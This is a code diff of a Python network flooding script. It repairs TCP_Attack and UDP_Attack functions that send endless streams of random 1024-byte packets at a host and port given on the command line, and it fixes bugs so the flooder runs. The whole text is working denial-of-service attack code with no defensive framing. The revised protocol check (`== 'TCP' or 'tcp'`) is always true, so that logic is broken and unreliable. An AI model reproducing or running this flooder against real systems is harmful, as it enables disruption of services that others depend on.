@@ -20,22 +20,22 @@ def TCP_Attack(target, port):
     tcp_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     tcp_serv.connect((target, port))
 
-    byte = os._urandom(1024)
+    byte = os.urandom(1024)
     
     sent = 1
     while True:
-        tcp_serv.send(data)
+        tcp_serv.send(byte)
         print("Sending ", sent, "TCP Package to", target, "on Port ", port)
         sent = sent + 1
 
 def UDP_Attack(target, port):
     udp_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    byte = os._urandom(1024)
+    byte = os.urandom(1024)
 
     sent = 1
     while True:
-        udp_serv.sendto(data, (target, port))
+        udp_serv.sendto(byte, (target, port))
         print("Sending ", sent, "UDP Package to", target, "on Port ", port)
         sent = sent + 1
 
@@ -46,11 +46,11 @@ class Main():
         Usage()
 
     else:
-        if sys.argv[4] == "TCP":
-            TCP_Attack(sys.argv[2], sys.argv[3])
+        if sys.argv[3] == "TCP" or "tcp":
+            TCP_Attack(str(sys.argv[1]), int(sys.argv[2]))
 
-        if sys.argv[4] == "UDP":
-            UDP_Attack(sys.argv[2], sys.argv[3])
+        if sys.argv[3] == "UDP" or "udp":
+            UDP_Attack(str(sys.argv[1]), int(sys.argv[2]))
 
 
 if __name__ == "__main__":
